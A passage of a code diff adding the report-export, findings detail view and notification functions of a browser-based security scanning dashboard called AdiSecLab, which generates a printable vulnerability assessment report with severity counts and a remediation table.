+    +'.ct{font-family:JetBrains Mono,monospace;font-size:11px;color:#00d4ff;letter-spacing:4px;text-transform:uppercase;margin-bottom:8px;position:relative;z-index:1}'
+    +'h1{font-size:32px;font-weight:800;color:#fff;margin-bottom:6px;position:relative;z-index:1}'
+    +'.ctg{font-family:JetBrains Mono,monospace;font-size:13px;color:#00d4ff;margin:11px 0;padding:6px 16px;border:1px solid rgba(0,212,255,.4);border-radius:5px;display:inline-block;position:relative;z-index:1}'
+    +'.crisk{display:inline-block;padding:7px 20px;border-radius:4px;font-weight:800;font-size:14px;letter-spacing:2px;margin:12px 0;position:relative;z-index:1}'
+    +'.rb{background:rgba(255,255,255,.1);border-radius:20px;height:8px;overflow:hidden;margin:7px 0 3px;width:320px}'
+    +'.rf{height:100%;border-radius:20px;background:linear-gradient(90deg,#00e5a0,#ffd60a,#ff7b00,#ff4560)}'
+    +'.cm{font-size:11px;color:#8fa3c0;margin-top:16px;line-height:2;position:relative;z-index:1}'
+    +'.cd{font-family:JetBrains Mono,monospace;font-size:10px;color:#4d6480;margin-top:22px;letter-spacing:1px;position:relative;z-index:1}'
+    +'.wrap{padding-top:18px}.sh{margin:24px 0 12px;padding-bottom:7px;border-bottom:2px solid #f0f0f0;display:flex;align-items:center;gap:8px}'
+    +'.sh h2{font-size:16px;font-weight:700;color:#111}'
+    +'.sg{display:grid;grid-template-columns:repeat(5,1fr);gap:8px;margin-bottom:16px}'
+    +'.sb{text-align:center;padding:13px;border-radius:7px;border:1px solid}'
+    +'.sn{font-size:28px;font-weight:800;line-height:1}.sl{font-size:10px;font-weight:600;text-transform:uppercase;letter-spacing:1px;margin-top:3px;color:#666}'
+    +'.ebox{background:#f8f9ff;border:1px solid #dde2ff;border-radius:7px;padding:15px;margin-bottom:15px}'
+    +'.ebox h3{font-size:13px;font-weight:700;color:#3040aa;margin-bottom:6px}'
+    +'.toc-i{display:flex;align-items:center;gap:8px;padding:7px 0;border-bottom:1px dotted #e0e0e0;font-size:12px}'
+    +'footer{text-align:center;padding:16px;border-top:1px solid #e0e0e0;margin-top:26px;font-size:11px;color:#aaa}'
+    +'</style></head><body>'
+    +'<div class="cover"><div class="cg"></div><div class="cl">A</div>'
+    +'<div class="ct">AdiSecLab v5.0.0</div><h1>Security Assessment Report</h1>'
+    +'<div class="ctg">'+tgt+'</div>'
+    +'<div class="crisk" style="background:'+rcol+'22;color:'+rcol+';border:2px solid '+rcol+'">\u26a0 '+rlbl+' \u2014 Score: '+score+'/100</div>'
+    +'<div class="rb"><div class="rf" style="width:'+score+'%"></div></div>'
+    +'<div class="cm">Scan Date: '+now.toLocaleDateString('en-US',{year:'numeric',month:'long',day:'numeric'})+' at '+now.toLocaleTimeString('en-US',{hour12:false})+'<br>Mode: '+scanMode+' | Vulnerabilities Found: '+findings.length+'</div>'
+    +'<div class="cd">Prepared by: Aditya Bhosale | adityabhosale212223@gmail.com<br>linkedin.com/in/bhsoaleaditya | AdiSecLab Bug Bounty Intelligence Platform</div>'
+    +'</div>'
+    +'<div class="wrap" style="page-break-before:always">'
+    +'<div class="sh"><h2>\uD83D\uDCCA Executive Summary</h2></div>'
+    +'<div class="ebox"><h3>Overall Risk: '+rlbl+' ('+score+'/100)</h3><p style="font-size:13px;color:#333;line-height:1.7">Assessment of <strong>'+tgt+'</strong> found <strong>'+findings.length+' vulnerabilities</strong>. Risk score: <strong style="color:'+rcol+'">'+score+'/100</strong>.</p></div>'
+    +'<div class="sg">'
+    +'<div class="sb" style="background:#fff0f2;border-color:#ffc0cc"><div class="sn" style="color:#ff4560">'+c.critical+'</div><div class="sl">Critical</div></div>'
+    +'<div class="sb" style="background:#fff5ef;border-color:#ffd0b0"><div class="sn" style="color:#ff7b00">'+c.high+'</div><div class="sl">High</div></div>'
+    +'<div class="sb" style="background:#fffbef;border-color:#ffe080"><div class="sn" style="color:#cc9900">'+c.medium+'</div><div class="sl">Medium</div></div>'
+    +'<div class="sb" style="background:#f0fff8;border-color:#b0f0d8"><div class="sn" style="color:#00a060">'+c.low+'</div><div class="sl">Low</div></div>'
+    +'<div class="sb" style="background:#f0faff;border-color:#a0e0ff"><div class="sn" style="color:#0099cc">'+c.info+'</div><div class="sl">Info</div></div>'
+    +'</div>'
+    +(c.critical>0?'<div style="background:#fff0f2;border-left:4px solid #ff4560;border-radius:4px;padding:10px 14px;margin-bottom:13px"><strong style="color:#ff4560">\u26a0 Critical Alert:</strong> <span style="font-size:13px;color:#333">'+c.critical+' critical vulnerabilities require immediate remediation.</span></div>':'')
+    +'<div class="sh"><h2>\uD83D\uDCCB Table of Contents</h2></div>'
+    +sorted.map(function(f,i){
+      return '<div class="toc-i"><span style="font-family:monospace;font-size:10px;color:#888;width:22px">'+String(i+1).padStart(2,'0')+'</span><span style="padding:2px 7px;border-radius:3px;font-size:10px;font-weight:700;'+sc(f.sv)+'">'+f.sv.toUpperCase()+'</span><span>'+f.nm+'</span><span style="margin-left:auto;font-family:monospace;font-size:11px;color:#888">'+f.tl+'</span></div>';
+    }).join('')
+    +'<div class="sh" style="page-break-before:always"><h2>\uD83C\uDFAF Detailed Findings</h2></div>'
+    +findingHTML
+    +'<div class="sh" style="page-break-before:always"><h2>\uD83D\uDCCB Remediation Priority Matrix</h2></div>'
+    +'<table style="width:100%;border-collapse:collapse;font-size:12px;margin-bottom:16px"><thead><tr style="background:#f0f0f0"><th style="padding:9px 11px;text-align:left;border:1px solid #ddd;font-size:10px">Priority</th><th style="padding:9px 11px;text-align:left;border:1px solid #ddd;font-size:10px">Finding</th><th style="padding:9px 11px;text-align:left;border:1px solid #ddd;font-size:10px">Tool</th><th style="padding:9px 11px;text-align:left;border:1px solid #ddd;font-size:10px">Effort</th><th style="padding:9px 11px;text-align:left;border:1px solid #ddd;font-size:10px">Timeline</th></tr></thead><tbody>'+prioRows+'</tbody></table>'
+    +'<footer>AdiSecLab v5.0.0 | Developed by Aditya Bhosale | adityabhosale212223@gmail.com | <a href="https://www.linkedin.com/in/bhsoaleaditya/" style="color:#0a66c2">linkedin.com/in/bhsoaleaditya</a><br><span style="font-size:10px">Confidential. Authorized security testing only. Disclose responsibly.</span></footer>'
+    +'</div></body></html>';
+
+  var blob=new Blob([html],{type:'text/html'});
+  var url=URL.createObjectURL(blob);
+  var win=window.open(url,'_blank');
+  if(win)setTimeout(function(){win.print();},900);
+  else notify('Allow popups then click Export PDF again','warn');
+  notify('PDF report opened \u2014 Print \u2192 Save as PDF','ok');
+}
+
+/* ═══ DETAIL VIEW ═══ */
+function openDetail(){
+  if(!findings.length){notify('No findings','warn');return;}
+  var c={critical:0,high:0,medium:0,low:0,info:0};findings.forEach(function(f){c[f.sv]++;});
+  var score=Math.min(100,c.critical*25+c.high*12+c.medium*5+c.low*2);
+  var rcol=score>=75?'var(--re)':score>=50?'var(--or)':score>=25?'var(--ye)':'var(--gr)';
+  var svCol={critical:'var(--re)',high:'var(--or)',medium:'var(--ye)',low:'var(--gr)',info:'var(--cy)'};
+  var body=document.getElementById('detail-body');body.innerHTML='';
+
+  var intro=document.createElement('div');
+  intro.innerHTML='<div style="display:flex;align-items:center;gap:14px;margin-bottom:11px">'
+    +'<div style="font-family:var(--disp);font-size:42px;font-weight:800;color:'+rcol+'">'+score+'</div>'
+    +'<div><div style="font-size:13px;font-weight:600;color:var(--t1);margin-bottom:3px">'+(score>=75?'CRITICAL RISK':score>=50?'HIGH RISK':score>=25?'MEDIUM RISK':'LOW RISK')+'</div>'
+    +'<div style="font-size:12px;color:var(--t2)">'+findings.length+' vulnerabilities</div></div></div>'
+    +'<div style="height:4px;background:var(--s3);border-radius:2px;overflow:hidden;margin-bottom:13px"><div style="height:100%;width:'+score+'%;background:linear-gradient(90deg,var(--vi),var(--re));border-radius:2px"></div></div>'
+    +'<div style="display:grid;grid-template-columns:repeat(5,1fr);gap:8px;margin-bottom:16px">'
+    +Object.keys(c).map(function(sv){return'<div style="text-align:center;padding:11px;background:var(--s2);border-radius:8px;border:1px solid var(--b1)"><div style="font-family:var(--disp);font-size:22px;font-weight:800;color:'+svCol[sv]+'">'+c[sv]+'</div><div style="font-size:10px;color:var(--t3);text-transform:uppercase;letter-spacing:1px">'+sv+'</div></div>';}).join('')
+    +'</div>';
+  body.appendChild(intro);
+
+  findings.forEach(function(f){
+    var rem=REMEDIATION[f.sv]||REMEDIATION.info;
+    var fx=TOOL_FIX[f.tl]||TOOL_FIX.default;
+    var card=document.createElement('div');
+    card.style.cssText='border:1px solid var(--b1);border-radius:8px;overflow:hidden;margin-bottom:11px';
+    var hd=document.createElement('div');
+    hd.style.cssText='padding:10px 14px;background:var(--s2);border-bottom:1px solid var(--b1);display:flex;align-items:center;gap:8px';
+    var badge=document.createElement('span');
+    badge.style.cssText='padding:2px 8px;border-radius:3px;font-size:10px;font-weight:700;background:'+svCol[f.sv]+';color:'+(f.sv==='medium'||f.sv==='low'?'#000':'#fff');
+    badge.textContent=f.sv.toUpperCase();
+    var nm=document.createElement('span');nm.style.cssText='font-weight:600;color:var(--t1)';nm.textContent=f.nm;
+    var tl=document.createElement('span');tl.style.cssText='margin-left:auto;font-family:var(--mono);font-size:10px;color:var(--vi)';tl.textContent=f.tl;
+    hd.appendChild(badge);hd.appendChild(nm);hd.appendChild(tl);
+    var bd=document.createElement('div');bd.style.cssText='padding:12px 14px';
+    var url=document.createElement('div');url.style.cssText='font-family:var(--mono);font-size:11px;color:var(--t3);margin-bottom:6px';url.textContent=f.url;
+    var ds=document.createElement('div');ds.style.cssText='font-size:12px;color:var(--t2);margin-bottom:11px;line-height:1.6';ds.textContent=f.ds;
+    var grid=document.createElement('div');grid.style.cssText='display:grid;grid-template-columns:1fr 1fr;gap:8px;font-size:11px';
+    function mk(bg,bc,lc,lb,tx){var d=document.createElement('div');d.style.cssText='background:'+bg+';border:1px solid '+bc+';border-radius:6px;padding:9px';var l=document.createElement('div');l.style.cssText='color:'+lc+';font-family:var(--mono);font-size:9px;letter-spacing:1.5px;margin-bottom:4px';l.textContent=lb;var t=document.createElement('div');t.style.cssText='color:var(--t2);line-height:1.6';t.textContent=tx;d.appendChild(l);d.appendChild(t);return d;}
+    grid.appendChild(mk('rgba(0,212,255,.05)','rgba(0,212,255,.15)','var(--cy)','WHAT TO FOCUS',rem.focus));
+    grid.appendChild(mk('rgba(0,229,160,.05)','rgba(0,229,160,.15)','var(--gr)','HOW TO USE '+f.tl,fx.how));
+    var fx2=mk('rgba(255,123,0,.05)','rgba(255,123,0,.15)','var(--or)','FIX / REMEDIATION',fx.fix);
+    fx2.style.gridColumn='1/-1';grid.appendChild(fx2);
+    bd.appendChild(url);bd.appendChild(ds);bd.appendChild(grid);
+    card.appendChild(hd);card.appendChild(bd);body.appendChild(card);
+  });
+  document.getElementById('detail-modal').classList.add('on');
+}
+
+/* ═══ NOTIFY ═══ */
+function notify(msg,type){
+  var area=document.getElementById('notifs');
+  var el=document.createElement('div');
+  el.className='notif'+(type?' '+type:'');
+  el.textContent=msg;
+  area.appendChild(el);
+  setTimeout(function(){
+    el.style.cssText='animation:nin .2s ease reverse;opacity:0;transform:translateX(16px)';
+    setTimeout(function(){if(el.parentNode)el.parentNode.removeChild(el);},220);
+  },2800);
+}
+
+/* ═══ BOOT ═══ */
+document.addEventListener('DOMContentLoaded',init);
+
+})();
+</script>
+</body>
+</html>
